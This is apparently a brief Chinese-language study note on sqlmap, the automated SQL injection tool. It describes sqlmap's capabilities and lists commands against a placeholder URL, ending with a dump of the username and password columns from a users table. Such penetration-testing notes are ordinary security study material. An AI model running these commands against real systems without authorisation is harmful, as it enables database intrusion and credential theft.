> [官网](https://sqlmap.org)kali自带
## 1.简介与使用
- 全自动化的开源 SQL 注入“神器”，用 Python 编写。
- 支持几乎所有的 DBMS（MySQL, Oracle, PostgreSQL, MSSQL 等）。
- 可以自动完成：发现注入点、获取数据库信息、脱库、读写文件、甚至拿操作系统 shell。
```cmd
# 最基础检测
sqlmap -u "http://target.com/page.php?id=1"

# 指定数据库类型
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# 获取当前数据库
sqlmap -u "http://target.com/page.php?id=1" --current-db

# 获取指定库的所有表
sqlmap -u "http://target.com/page.php?id=1" -D "security" --tables

# 获取指定表的字段
sqlmap -u "http://target.com/page.php?id=1" -D "security" -T "users" --columns

# 导出数据
sqlmap -u "http://target.com/page.php?id=1" -D "security" -T "users" -C "username,password" --dump
```
